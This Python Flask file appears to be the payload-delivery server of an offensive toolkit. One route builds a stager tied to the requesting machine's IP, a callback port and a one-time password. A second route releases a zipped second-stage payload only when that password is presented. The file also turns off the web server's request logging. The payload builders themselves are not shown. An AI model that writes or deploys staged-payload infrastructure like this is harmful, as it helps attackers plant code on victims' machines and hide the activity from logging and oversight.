from flask import Flask, request
import os
import threading
import config
import logging
from typing import List
import random
import string

from wheelie import __builder as wheelie_builder
from ravage import __builder as ravage_builder


app = Flask(__name__)

WEB_SERVER_PORT = '1337'

one_time_passwords = []  # type: List[str]


@app.route('/')
def _hello_world():
    return 'Hello world'


@app.route('/wheelie')
def _wheelie():
    one_time_password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
    one_time_passwords.append(one_time_password)
    remote_ip = request.remote_addr
    target = config.Target(remote_ip, remote_ip)
    return wheelie_builder.build(config.soundwave_ip, WEB_SERVER_PORT, request.remote_addr, target.local_port, one_time_password)


@app.route('/ravage')
def _ravage():
    one_time_password = request.headers.get('one-time-password')
    if one_time_password not in one_time_passwords:
        return 'Get outta here boi', 403
    one_time_passwords.remove(one_time_password)

    return ravage_builder.build_zip()


def _start():
    logging.getLogger('werkzeug').disabled = True
    os.environ['WERKZEUG_RUN_MAIN'] = 'true'

    app.logger.disabled = False
    app.run(host='0.0.0.0', port=WEB_SERVER_PORT, debug=False)


def main():
    print(f'Starting service on {config.soundwave_ip} using {config.ADAPTER}')
    threading.Thread(target=_start, daemon=True).start()
